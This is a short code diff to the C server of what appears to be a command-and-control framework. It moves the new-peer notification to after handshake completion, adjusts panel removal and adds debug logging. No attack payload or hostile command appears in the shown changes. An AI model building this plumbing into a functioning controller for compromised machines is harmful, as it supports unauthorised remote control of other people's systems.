@@ -41,6 +41,9 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
     laikaS_writeByte(&peer->sock, laikaS_isBigEndian());
     laikaS_endOutPacket(peer);
 
+    /* handshake (mostly) complete */
+    laikaC_onAddPeer(cnc, peer);
+
     LAIKA_DEBUG("accepted handshake from peer %lx\n", peer);
 }
 
@@ -98,6 +101,7 @@ void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
 
     /* notify connected panels of the newly connected peer */
     for (i = 0; i < cnc->panelCount; i++) {
+        LAIKA_DEBUG("sending new peer to %lx\n", peer);
         laikaC_sendNewPeer(cnc->panels[i], peer);
     }
 }
@@ -118,7 +122,7 @@ void laikaC_rmvPanel(struct sLaika_cnc *cnc, struct sLaika_peer *panel) {
     for (i = 0; i < cnc->panelCount; i++) {
         if (cnc->panels[i] == panel) { /* we found the index for our panel! */
             laikaM_rmvarray(cnc->panels, cnc->panelCount, i, 1);
-            break;
+            return;
         }
     }
 }
@@ -129,6 +133,8 @@ void laikaC_addPanel(struct sLaika_cnc *cnc, struct sLaika_peer *panel) {
 
     /* insert into authenticated panel table */
     cnc->panels[cnc->panelCount++] = panel;
+
+    LAIKA_DEBUG("added panel %lx!\n", panel);
 }
 
 void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
@@ -173,8 +179,6 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
             /* add to our pollList */
             laikaP_addSock(&cnc->pList, &peer->sock);
 
-            laikaC_onAddPeer(cnc, peer);
-
             LAIKA_DEBUG("new peer %lx!\n", peer);
             continue;
         }
@@ -200,6 +204,7 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
     /* flush pList's outQueue */
     for (i = 0; i < cnc->pList.outCount; i++) {
         peer = cnc->pList.outQueue[i];
+        LAIKA_DEBUG("sending OUT to %lx\n", peer);
         if (!laikaS_handlePeerOut(peer))
             laikaC_killPeer(cnc, peer);
     }
